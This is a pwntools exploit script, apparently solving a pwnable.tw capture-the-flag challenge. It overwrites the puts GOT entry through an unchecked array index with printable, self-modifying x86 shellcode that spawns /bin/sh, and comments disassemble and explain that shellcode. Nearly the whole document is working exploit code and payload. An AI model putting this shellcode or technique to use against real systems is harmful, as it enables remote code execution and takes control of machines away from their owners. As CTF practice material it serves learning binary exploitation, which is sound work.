from pwn import *

def add(index, name):
	s.sendline(str(1))
	_ = s.recv()
	s.sendline(str(index))
	_ = s.recv()
	s.sendline(name)

s = remote("chall.pwnable.tw", 10201)
s.recv()

got_plt_put = 0x0804a020
bss_note = 0x0804a060

shellcode = "R^j;X4;Ph//shh/binT[j#X4#PYI0N,I0N-PPYZj#X4(2~"

index = (got_plt_put - bss_note)/4

add(index, shellcode)

s.interactive()

s.close()

'''
the reason to use put is because edx store address of our shellcode 
------
call    _strdup
add     esp, 10h
mov     edx, eax
mov     eax, [ebp+var_60]
mov     ds:note[eax*4], edx
sub     esp, 0Ch
push    offset aDone    ; "Done !"
call    _puts
------
'''
'''
here is where shellcode from
---------------
0:  52                      push   edx    ; edx store address of the shellcode
1:  5e                      pop    esi    ; esi store address of the shellcode
2:  6a 3b                   push   0x3b        ; make eax = 0
4:  58                      pop    eax         ;      ''
5:  34 3b                   xor    al,0x3b     ;      ''
7:  50                      push   eax         ; push 0
8:  68 2f 2f 73 68          push   0x68732f2f  ; push hs//
d:  68 2f 62 69 6e          push   0x6e69622f  ; push nib/
12: 54                      push   esp
13: 5b                      pop    ebx         ; ebx hold address of /bin//sh\x00
14: 6a 23                   push   0x23        ; make eax = 0
16: 58                      pop    eax         ;     ''
17: 34 23                   xor    al,0x23     ;     ''
19: 50                      push   eax
1a: 59                      pop    ecx         ; ecx = 0
1b: 49                      dec    ecx         ; ecx = 0xffffffff. ecx = 2byte + cx. cx = ch + cl
1c: 30 4e 2c                xor    BYTE PTR [esi+0x2c],cl   ; make byte 0x2c of shellcode equal to 0xcd (= 0x32^0xff)
1f: 49                      dec    ecx         ; ecx = 0xfffffffe
20: 30 4e 2d                xor    BYTE PTR [esi+0x2d],cl   ; make byte 0x2d of shellcode equal to 0x80 (= 0x7e^0xfe)
23: 50                      push   eax
24: 50                      push   eax
25: 59                      pop    ecx         ; exc = 0
26: 5a                      pop    edx         ; edx = 0
27: 6a 23                   push   0x23        ; make eax = 0xb
29: 58                      pop    eax         ;      ''
2a: 34 28                   xor    al,0x28     ;      ''
2c: 32                      .byte 0x32         ; the 2 byte: hold room + xor
2d: 7e                      .byte 0x7e         ; .byte 0x90 for NOP
'''
